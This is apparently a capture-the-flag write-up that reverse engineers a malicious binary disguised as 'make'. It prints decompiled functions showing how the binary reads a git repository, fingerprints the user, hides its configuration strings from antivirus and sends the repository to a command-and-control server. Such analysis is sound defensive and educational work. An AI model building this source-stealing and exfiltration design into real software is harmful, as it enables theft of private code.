Now that we know where the malware is we need to understand what it is doing. We can see that we need the IP, port, and pub key of the malware so this let's us deduce several things. First and formost, this peice of malware is communicatinting to a remote server. This is very normal when malware is part of a bot net (unlikely due to the senerio) or a implant for an APT style attack communicating to a command and control server (C2) which is more likely in this case.

We also already know that this is not a stripped binary which will make it easier to reverse engineer which is very nice.

Taking a closer look at the file we see that it is:
```
$file make
make: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
```

It is incredibly nice that debugging information was included as well as that will help work with this.

The first step for me of analizing a binary is always running the strings command on it. This prints out all ascii characters in the binary and can give you an idea of what the binary does based on the function names and imports.

However, a there's a god awful number of strings in the binary file so it is impossible to look at all of them. (A total of `$strings make | wc -l 35855`). The impoported functions are normally at the top of the strings in a binary file so I looked at with `strings make | less`. This didn't give me too much interesting information. I did find several git function importas and socket imported:

```
...
memcmp
socket
memchr
pthread_mutex_unlock
strcmp
ntohl
__deregister_frame_info
git_diff_commit_as_email
git_revwalk_free
git_repository_open_ext
git_libgit2_init
git_revwalk_push_head
git_oid_tostr_s
git_revwalk_new
git_commit_author
git_commit_free
git_revwalk_sorting
git_repository_open
git_commit_summary
git_commit_lookup
git_libgit2_shutdown
git_revwalk_next
git_buf_dispose
git_repository_free
...
```

From this I can guess that something is being done witht the github repo and my suspision that the malware reaches out to a remote server is suppupported. From the previous challenge discription we know that this company has had problems with their source code being stolen before and all of these clues point to that.

At this point, I moved into more advanced static analisis of the binary using Gidrah because that seemed fiting due to the fact this is an NSA challenge. However tools like IDA, radare2, or binary ninja all would have worked as well. 

As always, when analizing a program let's start at main if we know where that is. It's a pretty short setup so I can included it all here:

```C
int main(int argc,char **argv)

{
  int iVar1;
  char *pcVar2;
  
  gitGrabber();
  pcVar2 = tgexpgbgxulli(0xe);
  *argv = pcVar2;
  iVar1 = execvp(*argv,argv);
  return iVar1;
}
```

We see that this main function calls a function called gitGrabber, then get's some arguments from tgexpgbgxulli that then calls some other program using execvp. This gives us 2 directions to work in. We can either explore the  tgexpgbgxulli function or the gitGrabber. While I did originally look at tgexpgbgxulli, when working on this progect it is hard to understand without looking at gitGrabber. (I'll also note that gitGrabber is human readable which may be a nudge by the compition creators that we should look there first. A nudge I missed at first, but see now with hindsight.)

Opening gitGraber we see a more substantial function:
```C
void gitGrabber(void)

{
  long lVar1;
  bool bVar2;
  int __fd;
  int iVar3;
  char *pcVar4;
  char *ip_00;
  size_t length;
  long in_FS_OFFSET;
  int successful;
  int lockfd;
  int rv;
  char *output;
  char *ip;
  char *lockfile;
  string tmp;
  basic_string local_1c8 [32];
  stringstream ss;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  bVar2 = false;
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  basic_stringstream();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 0010a283 to 0010a3e5 has its CatchHandler @ 0010a416 */
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0)) {
    std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str();
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp,local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1c8);
    pcVar4 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
                     c_str();
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
    if (iVar3 == 0) {
      bVar2 = true;
    }
  }
  git_libgit2_shutdown();
  if ((__fd != -1) && (close(__fd), !bVar2)) {
    pcVar4 = tgexpgbgxulli(6);
    unlink(pcVar4);
    aotxxfxjjvuoy(6);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&tmp);
  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::
  ~basic_stringstream((basic_stringstream<char,std::char_traits<char>,std::allocator<char>> *)&ss);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Looking through this we can get a pretty general idea of what is happening based on the varaible names (which we will assume are not missleading, but who knows).

In these lines
```C
  git_libgit2_init();
  __fd = qyvqmmhtjmlie();
  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0))
```

It seems as if some sort of file discriptor is opended and then several checks happen, if any of these checks fail then the program exits out early. This means we probably want these checks to succseed.

Opening the qyvqmmhtjmlie function we see that it does the following

```C
  int iVar1;
  char *__file;
  int fd;
  char *lockfile;
  __file = tgexpgbgxulli(6);
  iVar1 = open(__file,0xc1,0x1a4);
  aotxxfxjjvuoy(6);
  return iVar1;
```

and  ndldgaiugwdhv does:
```C
int iVar1;
  char *pcVar2;
  int result;
  int rv;
  char *gitpath;
  char *pidof_git;
  
  pcVar2 = tgexpgbgxulli(7);
  iVar1 = git_repository_open_ext(0,pcVar2,1,0);
  aotxxfxjjvuoy(7);
  if (iVar1 == 0) {
    pcVar2 = tgexpgbgxulli(8);
    iVar1 = system(pcVar2);
    aotxxfxjjvuoy(8);
    if (iVar1 == 0) {
      iVar1 = -1;
    }
    else {
      iVar1 = 0;
    }
  }
  else {
    iVar1 = -1;
  }
  return iVar1;
```

Also looking through dxfivqvkpuunm (which was way too long to include and is in a seperate file in this directory)

We can guess by the nuber of refrences to git that this is where the git repo is looked at before being stollen. It also makes sense that if there is no git repo on the system, then it can't do anything and simply returns.

Looking farther down in the program we see the following lines of code:

```C
    ip_00 = tgexpgbgxulli(0x13);
    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
    aotxxfxjjvuoy(0x13);
```
and after this section of code, the program seems to end, so we can assume that this is where the meat of the operation happens.

However, before we go farther it seems that we have found where 2 of the flags are. In order to use a socket (which we know from before this code does) you need to have an IP address and a port number. We directly see an variable labeled IP here and next to it an hard coded integer. At this point, I opended the program in GDB with GEF installed and simply called tgexpgbgxulli(0x13) which gave me the ip address and converted the hex port to an integer. (I will go into detail later in the walkthrough how to open and run stuff in GDB.) Both of these flags were correct letting me know that I was on the correct path.

Now lets take a look at the monstrosity that is kvhlfowzlznog. Since it has over 200 lines (many longer then a single line) I won't paste it here, but the full decompiled code is also in the git repo. 

Let's first look at a reduced first chunk:
```C
int kvhlfowzlznog(char *ip,uint16_t port,char *output,size_t length)
{
  ...
  ...
  yridlcsrsfalm(&my_uuid,0x10);
  ...
  ...
  username = getlogin();
  if (username == (char *)0x0) {
    username = tgexpgbgxulli(5);
  }
  version_00 = tgexpgbgxulli(0x11);
  uname((utsname *)&ubuf);
  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
  fingerprint(&fp,username,version_00,ubuf.sysname,tv.tv_sec);
                    /* try { // try from 0015a6ea to 0015a6ee has its CatchHandler @ 0015ac64 */
  fpToK(&session_key,username,version_00,tv.tv_sec);
                    /* try { // try from 0015a6f4 to 0015a746 has its CatchHandler @ 0015ac50 */
  aotxxfxjjvuoy(0x11);
  aotxxfxjjvuoy(5);
  sock_00 = biuuwoagwpgxf(ip,port);
  if (-1 < sock_00) {
  ...
  ...
```

At this point if we haden't guessed what the port was the 2nd argument passsed to the function we could definatly do that now. We also have seen the tgex function called enugh times that we are able to guess what it's purpose is simply from a black box perspective. It seems to be hiding the configuration strings needed for this program. This makes sense because anti virus software can be given certian strings (like a known bad IP) that cause it to block a program from running. Rather then simply hard code those values in, they are encrypted (or encoded since the key is also in the code) to prevent easy detection.


